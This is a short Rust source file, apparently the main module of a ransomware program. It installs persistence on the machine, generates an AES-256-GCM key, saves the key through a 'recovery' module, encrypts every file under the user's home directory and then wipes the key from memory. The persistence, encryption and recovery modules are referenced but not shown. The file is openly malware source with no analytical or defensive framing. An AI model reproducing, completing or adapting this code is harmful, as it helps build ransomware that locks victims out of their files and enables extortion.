mod encryption;
mod persistence;
mod recovery;

use aes_gcm::{aead::OsRng, Aes256Gcm, KeyInit};
use dirs2::home_dir;
use encryption::encrypt_files;
use persistence::install_persistence;
use recovery::save_key;
use zeroize::Zeroize;

// Main function of the program
fn main() {
    let dir = home_dir().expect("[!] Could not open home directory");

    if let Err(e) = install_persistence() {
        println!("[!] Persistence installation failed: {e}");
    }

    // Generate a cipher to encrypt files with aes2356 algorithm
    let mut key = Aes256Gcm::generate_key(OsRng);
    let cipher = Aes256Gcm::new(&key);

    save_key(key.to_vec()).expect("[!] Failed to save the recovery key");

    encrypt_files(dir, cipher);

    // Zeroing the key in memory
    key.zeroize();
}
